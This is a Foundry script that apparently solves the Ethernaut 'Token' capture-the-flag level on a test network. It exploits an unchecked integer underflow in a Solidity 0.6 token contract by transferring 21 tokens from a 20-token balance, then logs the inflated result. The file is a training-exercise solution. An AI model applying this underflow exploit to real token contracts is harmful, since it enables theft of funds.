// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import {Script, console} from "lib/forge-std/src/Script.sol";
import {Token} from "../src/Token.sol";

contract ForceSolution is Script {
    Token public token;

    function run() external {
        vm.startBroadcast();// vm.envUint("PRIVATE_KEY") <= Faulty

        console.log("Solving Token...");
        // if (block.chainid == 11155111) {
        //     token = Token(0x60bF87c457fe67d023B6cE684B2e83B7b73dd5c8);
        // } else {
        //     token = new Token(20);
        // }
        console.log("Old balance: ", address(this).balance);
        token = Token(0x8e318FD75673748C76d9C15706784A956860a92c);

        console.log("Contract: ", address(token));
        console.log("sender: ", msg.sender);
        console.log("script: ", address(this));
        console.log("Old balance: ", token.balanceOf(msg.sender));


        token.transfer(address(0), 21);
        console.log("New balance: ", token.balanceOf(msg.sender));
        vm.stopBroadcast();
        console.log("Token Solved!");
    }
}
